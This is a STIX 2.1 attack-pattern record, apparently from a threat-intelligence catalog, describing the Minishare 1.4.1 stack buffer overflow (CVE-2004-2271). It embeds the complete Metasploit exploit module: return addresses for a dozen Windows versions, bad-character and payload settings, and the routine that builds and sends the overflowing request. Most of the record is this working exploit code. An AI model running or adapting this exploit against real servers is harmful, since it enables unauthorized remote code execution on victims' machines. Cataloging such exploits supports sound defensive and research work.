{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6f9382b1-9dbc-4661-82c3-49fc1835b75a",
    "created": "2024-08-14T16:52:54.71118Z",
    "modified": "2024-08-14T16:52:54.711184Z",
    "name": "Minishare 1.4.1 Buffer Overflow",
    "description": " This is a simple buffer overflow for the minishare web server. This flaw affects all versions prior to 1.4.2. This is a plain stack buffer overflow that requires a \"jmp esp\" to reach the payload, making this difficult to target many platforms at once. This module has been successfully tested against 1.4.1. Version 1.3.4 and below do not seem to be vulnerable. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/minishare_get_overflow.rb",
            "external_id": "minishare_get_overflow.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-2271"
        },
        {
            "source_name": "reference",
            "url": "http://archives.neohapsis.com/archives/fulldisclosure/2004-11/0208.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Minishare 1.4.1 Buffer Overflow',\n      'Description'    => %q{\n          This is a simple buffer overflow for the minishare web\n        server. This flaw affects all versions prior to 1.4.2. This\n        is a plain stack buffer overflow that requires a \"jmp esp\" to reach\n        the payload, making this difficult to target many platforms\n        at once. This module has been successfully tested against\n        1.4.1. Version 1.3.4 and below do not seem to be vulnerable.\n      },\n      'Author'         => [ 'acaro <acaro[at]jervus.it>' ],\n      'License'        => BSD_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2004-2271'],\n          [ 'OSVDB', '11530'],\n          [ 'BID', '11620'],\n          [ 'URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2004-11/0208.html'],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\\x40\",\n          'MinNops'  => 64,\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows 2000 SP0-SP3 English', { 'Rets' => [ 1787, 0x7754a3ab ]}], # jmp esp\n          ['Windows 2000 SP4 English',     { 'Rets' => [ 1787, 0x7517f163 ]}], # jmp esp\n          ['Windows XP SP0-SP1 English',   { 'Rets' => [ 1787, 0x71ab1d54 ]}], # push esp, ret\n          ['Windows XP SP2 English',       { 'Rets' => [ 1787, 0x71ab9372 ]}], # push esp, ret\n          ['Windows 2003 SP0 English',     { 'Rets' => [ 1787, 0x71c03c4d ]}], # push esp, ret\n          ['Windows 2003 SP1 English',     { 'Rets' => [ 1787, 0x77403680 ]}], # jmp esp\n          ['Windows 2003 SP2 English',     { 'Rets' => [ 1787, 0x77402680 ]}], # jmp esp\n          ['Windows NT 4.0 SP6',           { 'Rets' => [ 1787, 0x77f329f8 ]}], # jmp esp\n          ['Windows XP SP2 German',        { 'Rets' => [ 1787, 0x77d5af0a ]}], # jmp esp\n          ['Windows XP SP2 Polish',        { 'Rets' => [ 1787, 0x77d4e26e ]}], # jmp esp\n          ['Windows XP SP2 French',        { 'Rets' => [ 1787, 0x77d5af0a ]}], # jmp esp\n          ['Windows XP SP3 French',        { 'Rets' => [ 1787, 0x7e3a9353 ]}], # jmp esp\n        ],\n      'DefaultOptions' =>\n        {\n          'WfsDelay' => 30\n        },\n      'DisclosureDate' => '2004-11-07'))\n  end\n\n  def exploit\n    uri = rand_text_alphanumeric(target['Rets'][0])\n    uri << [target['Rets'][1]].pack('V')\n    uri << payload.encoded\n\n    print_status(\"Trying target address 0x%.8x...\" % target['Rets'][1])\n    send_request_raw({\n      'uri' => uri\n    }, 5)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-11-07",
    "x_mitre_platforms": [
        "win'"
    ]
}